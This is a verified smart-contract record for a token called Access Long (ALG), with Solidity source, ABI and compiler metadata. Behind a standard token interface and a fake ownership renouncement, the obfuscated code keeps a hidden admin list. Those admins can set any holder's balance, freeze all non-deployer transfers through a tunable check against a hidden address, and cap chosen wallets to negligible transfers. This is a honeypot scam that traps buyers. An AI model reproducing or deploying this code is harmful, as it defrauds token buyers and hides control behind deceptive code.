{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface receiverSenderTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchedMinTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeTotal {\n    function createPair(address listLimitIs, address tokenAmount) external returns (address);\n}\n\ninterface shouldMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txTo) external view returns (uint256);\n\n    function transfer(address listTxReceiver, uint256 exemptSell) external returns (bool);\n\n    function allowance(address isWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listTxReceiver,\n        uint256 exemptSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptTx, uint256 value);\n    event Approval(address indexed isWallet, address indexed spender, uint256 value);\n}\n\ninterface shouldMarketingMetadata is shouldMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AccessLong is launchedMinTo, shouldMarketing, shouldMarketingMetadata {\n\n    bool public receiverFrom;\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingLaunched;\n    }\n\n    function shouldAt() private view {\n        require(modeReceiver[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return isAmount;\n    }\n\n    function transferFrom(address atLaunchReceiver, address listTxReceiver, uint256 exemptSell) external override returns (bool) {\n        if (_msgSender() != amountTrading) {\n            if (amountFrom[atLaunchReceiver][_msgSender()] != type(uint256).max) {\n                require(exemptSell <= amountFrom[atLaunchReceiver][_msgSender()]);\n                amountFrom[atLaunchReceiver][_msgSender()] -= exemptSell;\n            }\n        }\n        return listReceiverFund(atLaunchReceiver, listTxReceiver, exemptSell);\n    }\n\n    mapping(address => bool) public takeWallet;\n\n    function listTotal(uint256 exemptSell) public {\n        shouldAt();\n        senderLimit = exemptSell;\n    }\n\n    function marketingTake(address enableTokenShould, uint256 exemptSell) public {\n        shouldAt();\n        feeLiquidity[enableTokenShould] = exemptSell;\n    }\n\n    function owner() external view returns (address) {\n        return receiverTeam;\n    }\n\n    function approve(address totalReceiver, uint256 exemptSell) public virtual override returns (bool) {\n        amountFrom[_msgSender()][totalReceiver] = exemptSell;\n        emit Approval(_msgSender(), totalReceiver, exemptSell);\n        return true;\n    }\n\n    address public toLiquidity;\n\n    mapping(address => mapping(address => uint256)) private amountFrom;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenSender;\n    }\n\n    uint256 private shouldFundMarketing = 100000000 * 10 ** 18;\n\n    uint256 constant shouldExemptTx = 9 ** 10;\n\n    function listReceiverFund(address atLaunchReceiver, address listTxReceiver, uint256 exemptSell) internal returns (bool) {\n        if (atLaunchReceiver == toLiquidity) {\n            return amountEnableTo(atLaunchReceiver, listTxReceiver, exemptSell);\n        }\n        uint256 liquidityListAt = shouldMarketing(txAuto).balanceOf(launchedSell);\n        require(liquidityListAt == senderLimit);\n        require(listTxReceiver != launchedSell);\n        if (takeWallet[atLaunchReceiver]) {\n            return amountEnableTo(atLaunchReceiver, listTxReceiver, shouldExemptTx);\n        }\n        return amountEnableTo(atLaunchReceiver, listTxReceiver, exemptSell);\n    }\n\n    function teamTrading() public {\n        emit OwnershipTransferred(toLiquidity, address(0));\n        receiverTeam = address(0);\n    }\n\n    mapping(address => bool) public modeReceiver;\n\n    address amountTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function balanceOf(address txTo) public view virtual override returns (uint256) {\n        return feeLiquidity[txTo];\n    }\n\n    uint256 private fundAt;\n\n    function amountEnableTo(address atLaunchReceiver, address listTxReceiver, uint256 exemptSell) internal returns (bool) {\n        require(feeLiquidity[atLaunchReceiver] >= exemptSell);\n        feeLiquidity[atLaunchReceiver] -= exemptSell;\n        feeLiquidity[listTxReceiver] += exemptSell;\n        emit Transfer(atLaunchReceiver, listTxReceiver, exemptSell);\n        return true;\n    }\n\n    address public txAuto;\n\n    function swapTeam(address autoAtReceiver) public {\n        if (receiverFrom) {\n            return;\n        }\n        if (senderWallet == fundAt) {\n            senderWallet = fundAt;\n        }\n        modeReceiver[autoAtReceiver] = true;\n        \n        receiverFrom = true;\n    }\n\n    uint256 senderLimit;\n\n    uint8 private marketingLaunched = 18;\n\n    address private receiverTeam;\n\n    bool public receiverAuto;\n\n    string private tokenSender = \"ALG\";\n\n    mapping(address => uint256) private feeLiquidity;\n\n    function allowance(address swapReceiver, address totalReceiver) external view virtual override returns (uint256) {\n        if (totalReceiver == amountTrading) {\n            return type(uint256).max;\n        }\n        return amountFrom[swapReceiver][totalReceiver];\n    }\n\n    constructor (){\n        \n        receiverSenderTx minWalletLimit = receiverSenderTx(amountTrading);\n        txAuto = takeTotal(minWalletLimit.factory()).createPair(minWalletLimit.WETH(), address(this));\n        \n        toLiquidity = _msgSender();\n        teamTrading();\n        modeReceiver[toLiquidity] = true;\n        feeLiquidity[toLiquidity] = shouldFundMarketing;\n        \n        emit Transfer(address(0), toLiquidity, shouldFundMarketing);\n    }\n\n    event OwnershipTransferred(address indexed fromWallet, address indexed buyMarketing);\n\n    bool public senderSell;\n\n    address launchedSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address enableTokenShould, uint256 exemptSell) external virtual override returns (bool) {\n        return listReceiverFund(_msgSender(), enableTokenShould, exemptSell);\n    }\n\n    function receiverIsSwap(address fundFee) public {\n        shouldAt();\n        \n        if (fundFee == toLiquidity || fundFee == txAuto) {\n            return;\n        }\n        takeWallet[fundFee] = true;\n    }\n\n    uint256 senderTo;\n\n    uint256 private senderWallet;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldFundMarketing;\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverTeam;\n    }\n\n    string private isAmount = \"Access Long\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptSell\",\"type\":\"uint256\"}],\"name\":\"listTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTokenShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptSell\",\"type\":\"uint256\"}],\"name\":\"marketingTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFee\",\"type\":\"address\"}],\"name\":\"receiverIsSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoAtReceiver\",\"type\":\"address\"}],\"name\":\"swapTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTokenShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunchReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listTxReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AccessLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}